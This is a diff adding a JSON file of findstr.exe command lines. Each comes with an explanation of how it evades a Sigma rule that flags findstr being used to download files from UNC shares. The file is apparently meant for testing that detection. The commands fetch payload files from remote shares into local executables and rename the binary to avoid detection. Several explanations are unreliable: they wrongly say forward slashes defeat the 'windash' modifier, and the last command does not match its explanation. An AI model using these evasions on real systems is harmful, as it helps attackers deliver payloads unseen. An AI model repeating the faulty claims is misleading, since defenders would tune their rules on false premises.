@@ -1,0 +1,46 @@
+[
+  {
+    "output": "findstr.exe /v /l \"dummy\" \"\\\\192.168.1.100\\share\\payload.txt\"",
+    "explanation": "The rule explicitly uses the 'windash' modifier to enforce matching on standard dashes (' -v ' and ' -l '). Because findstr natively supports forward slashes ('/v' and '/l') interchangeably for command-line arguments, substituting the hyphens completely bypasses the 'selection_cli_download_1' and 'selection_cli_download_2' conditions."
+  },
+  {
+    "output": "cmd.exe /c \"findstr -v -l . \\\\192.168.1.100\\share\\payload.txt\"",
+    "explanation": "The rule looks for flag matches with explicit spaces around them (e.g., ' -v ' and ' -l '). Combining flags or omitting trailing whitespace by immediately following the flag with a search pattern string (such as utilizing '.' as a wildcard regex symbol without a space) breaks the strict text sequence matching pattern."
+  },
+  {
+    "output": "cmd.exe /c copy C:\\Windows\\System32\\findstr.exe C:\\Temp\\search.exe && C:\\Temp\\search.exe -v -l \"string\" \\\\192.168.1.100\\share\\payload.txt",
+    "explanation": "The detection logic requires a true value for 'selection_findstr', which evaluates the process image file name path suffix and original file name headers. Copying the binary to a writable directory under a randomized placeholder title decouples the 'Image' parameter constraint entirely."
+  },
+  {
+    "output": "findstr /vl \"DoNotMatchThisString\" \\\\127.0.0.1\\c$\\temp\\payload.exe > C:\\temp\\downloaded.exe",
+    "explanation": "Bypasses the rule by combining the 'v' and 'l' switches into a single '/vl' argument. The rule's conditions (selection_cli_download_1 and selection_cli_download_2) specifically look for isolated ' -v ' and ' -l ' strings (with surrounding spaces), failing to match combined command-line flags."
+  },
+  {
+    "output": "findstr /v /r \"SuperUniqueStringToNotMatch123\" \\\\127.0.0.1\\c$\\temp\\payload.exe > C:\\temp\\downloaded.exe",
+    "explanation": "Bypasses the rule by replacing the literal search switch '/l' with the regular expression search switch '/r' (or omitting '/l' entirely). Since the search string is designed to not match any lines in the file, '/v' outputs the entire file content, achieving the download without triggering the 'selection_cli_download_2' condition."
+  },
+  {
+    "output": "findstr /V /L \"searchstring\" \\\\127.0.0.1\\share\\payload.txt",
+    "explanation": "The original Sigma rule looks for specific CLI flags using the 'windash' modifier (usually mapping to ' -v ' and ' -l '). By using forward slashes (/) instead of dashes (-), which is standard Windows CLI behavior, the rule's 'contains' logic for the specific string ' -v ' is bypassed while the command remains functional."
+  },
+  {
+    "output": "findstr -v-l \"searchstring\" \\\\127.0.0.1\\share\\payload.txt",
+    "explanation": "The rule expects spaces around the flags (e.g., ' -v '). Windows command line parsing often allows flags to be concatenated or separated by different characters. Removing the spaces between the flags prevents the 'contains' match for ' -v ' and ' -l ' from triggering."
+  },
+  {
+    "output": "findstr /v /l \"arbitrary_string\" \\\\127.0.0.1\\share\\payload.txt",
+    "explanation": "The Sigma rule specifically looks for the '-' (dash) character preceding the flags 'v' and 'l' (selection_cli_download_1 and 2). In Windows, many native binaries, including findstr.exe, accept forward slashes '/' as valid argument delimiters. By using '/v' and '/l' instead of '-v' and '-l', the command achieves the same remote file access/download functionality while failing the 'contains|windash' string match."
+  },
+  {
+    "output": "findstr -vl \"string\" \\\\10.0.0.5\\share\\file.exe",
+    "explanation": "The rule checks for ' -v ' and ' -l ' as discrete strings with surrounding spaces or specific dash patterns. By grouping the flags together (e.g., -vl or -lv), the specific substring matches for ' -v ' and ' -l ' are avoided, even though findstr will parse and execute both flags correctly."
+  },
+  {
+    "output": "findstr /V /L \"NonExistentString\" \\\\10.0.0.5\\share\\payload.exe",
+    "explanation": "The original Sigma rule searches for specific CLI flags using the 'windash' modifier, which typically looks for the hyphen character ('-v' and '-l'). By using the forward slash ('/') which is functionally equivalent in Windows for findstr flags, the 'selection_cli_download_1' and 'selection_cli_download_2' conditions are bypassed while achieving the same remote file access behavior."
+  },
+  {
+    "output": "findstr -v -l . C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "explanation": "The rule requires all three 'selection_cli_download' conditions to be met, including the presence of a UNC path ('\\\\'). By mapping the remote share to a local drive letter (e.g., 'net use Z: \\\\10.0.0.5\\share') and then running findstr against the mapped drive (e.g., 'findstr -v -l . Z:\\payload.exe'), the command line no longer contains the double backslash, thus failing the 'selection_cli_download_3' condition."
+  }
+]
